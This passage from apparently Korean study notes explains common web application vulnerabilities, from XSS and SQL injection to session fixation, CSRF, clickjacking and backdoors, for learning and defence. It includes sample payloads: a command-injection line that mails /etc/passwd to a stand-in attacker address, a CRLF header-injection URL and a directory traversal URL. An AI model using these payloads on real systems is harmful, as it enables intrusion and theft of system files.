`클라이언트 측에서 Javascript를 이용한 체크`, 웹 `애플리케이션에 들어왔을 때 입력값에 대한 체크`는 근본적인 보안 대책이 아닙니다. 애플리케이션이 DB, FileSystem에 직접 접근하는 `출력 값의 이스케이프가 가장 근본적인 보안 대책`입니다. ID가 delete라고 해도 Form에 대한 Validation은 아무 문제가 없습니다. 하지만, SQL문을 호출할 때에는 delete라는 예약어가 어떤 일을 수행할지 모르기 때문에 출력 값 이스케이프에 신경써야 합니다.

#### 크로스 사이트 스크립팅

`크로스 사이트 스크립팅(XSS- Cross-Site Scripting)`은 유저를 공격자가 의도한 웹 사이트에 방문하도록 하여 개인정보, 쿠키 등을 탈취하는 공격 방법입니다. 게시판에 `<script>쿠키탈취</script>`와 같은 `javascript`를 삽입하여 의도치않은 동작을 유도하는 것도 대표적인 방법입니다.

#### SQL Injection

공격자가 웹 애플리케이션에서 이용하고 있는 데이터베이스에 비정상적인 SQL문을 실행하거나 개인정보를 탈취하는 공격 방법입니다.

#### OS Command Injection

웹 애플리케이션을 경유하여 OS 명령을 부정하게 실행하는 공격입니다. 메일을 송신하는 OS 커맨드가 수행된다는 것을 알면 다음과 같이 추가 명령을 호출할 수 있습니다.

```cmd
| /user/sbin/sendmail ; cat /etc/passwd | mail hack@example.kr
```

메일 주소에 `; cat /etc/passwd | mail hack@example.kr`를 작성하면 passwd를 탈취할 수 있습니다.

#### HTTP Header Injection

공격자가 리스폰스 헤더 필드에 개행 문자 등을 삽입함으로써 임의의 리스폰스 헤더 필드나 바디를 추가하는 수동적 공격입니다.

##### 헤더 필드 추가

`Location: http://example.com/?cat=101%0D%0ASet-Cookie:+SID=123456789`에서 `%0D%0A`는 개행문자를 의미합니다. 다른 사람이 보내는 리퀘스트에 헤더를 추가하는 공격입니다. 이 공격은 `세션 픽세이션` 공격과 함께 사용하여 다른 유저로 위장할 가능성이 있습니다.

##### HTTP 리스폰스 분할 공격

리스폰스 문자열에 ` %0D%0A``%0D%0A ` 두 개를 삽입해, 리스폰스 바디를 작성할 수 있습니다. 이 공격은 크로스 사이트 스크립팅(XSS)와 같은 효과를 얻을 수 있습니다. 이것 외에도 리스폰스 여러 개를 모아 돌려보내는 기능을 악용하여 캐시 서버 등에 임의의 콘텐츠를 캐시하는 것도 가능합니다. 이를 `캐시 오염` 이라고 부릅니다.

#### 메일 헤더 인젝션

웹 애플리케이션의 메일 송신 기능에 공격자가 `To` 및 `Subject` 등의 메일 헤더를 부정하게 추가하는 공격입니다. 취약성이 있는 서버를 이용하여 스팸 메일이나 바이러스 메일 등을 임의의 주소로 송신할 수 있습니다.

#### 디렉터리 접근 공격

`디렉터리 트래버설(Directory Traversal)`이란 비공개 디렉터리 파일에 대해서 부정하게 디렉터리 패스를 가로질러 액세스하는 공격입니다.

`http://example.com/read.php?log=../../etc/passwd`

### 웹 서버의 설정이나 설계 미비로 인한 취약성

#### 강제 브라우징

디렉터리 트래버설과 유사합니다. 공개되지 말아야할 파일들에 대한 설정을 추가하지 않아 발생하는 공격입니다.

`http://www.example.com/cgi-bin/entry.bak`

#### 부적절한 에러 메시지 처리

에러 메시지를 친절하게 설명하여 공격자에게 공격 정보를 제공하게 되는 상황이 발생하기도 합니다.

ex) "존재하지 않는 아이디 입니다." 와 같은 에러 메시지는 공격자에게 정보를 제공하게 됩니다.

#### 오픈 리다이렉트

오픈 리다이렉트는 지정한 임의의 URL로 리다이렉트 하는 기능입니다. 공격자가 이 기능을 이용하는 파라미터에 함정을 설치하여 XSS 공격과 연계할 수 있습니다.

### 세션 관리 미비로 인한 취약성

#### 세션 하이재킹

`크로스 사이트 스크립팅`과 같은 공격을 이용해서 유저의 세션 ID를 훔치는 공격입니다.

#### 세션 픽세이션

공격자가 지정한 세션 ID를 유저에게 강제적으로 사용하도록 합니다. 유저는 지정된 세션 ID를 가지고 사이트에 대한 인증을 수행하면 공격자는 `유저`로 위장할 수 있습니다.

#### 크로스 사이트 리퀘스트 포저리

![csrf](./images/csrf.png)

인증된 유저가 의도하지 않은 개인 정보나 설정 정보 등을 공격자가 설치해둔 함정에 의해 강제로 변경하거나 실행시키는 공격입니다.

ex) 어떤 버튼을 눌렀더니, 게시판에 유저의 ID로 스팸성 게시물이 등록된다.

### 기타

#### 패스워드 크래킹

패스워드를 찾아내 인증을 하는 공격입니다. `Brute-Force`, `Dictionary Attack`, `Rainbow-table` 등의 공격이 있지만, Hash함수에 salt를 추가하는 방법으로 대부분 보안이 가능합니다.

#### 클릭 재킹

투명한 버튼이나 링크를 함정으로 사용할 웹 페이지에 심어두고, 유저에게 링크를 클릭하게 함으로써 의도하지 않은 콘텐츠에 액세스 시키는 공격입니다.

ex) 한글 2010을 불법 다운로드 하려고 블로그에 들어가서 클릭했더니 다른 사이트로 연결되고 팝업창 여러개가 뜨도록 만드는 공격

#### DoS 공격

서비스 거부 공격이라고 하여, 대량의 리퀘스트를 보내 서버의 기능을 마비시키는 공격입니다.

#### DDoS 공격

`Distributed Denial of Service`의 줄임말로 여러 대의 컴퓨터에서 동시에 DoS공격을 수행하는 것을 의미합니다. 대부분 여러대의 컴퓨터는 자신의 의사와 관계없이 공격을 수행하는 `바이러스에 감염된 컴퓨터`일 가능성이 큽니다.

#### 백도어

백도어는 제한된 기능을 정규 절차를 밟지 않고 이용하기 위해 설치된 뒷문입니다. 웹 애플리케이션을 수정해서 설치한 백도어는 정상적으로 이용하는 것과 구별하기가 어렵기 때문에 발견이 어렵습니다.
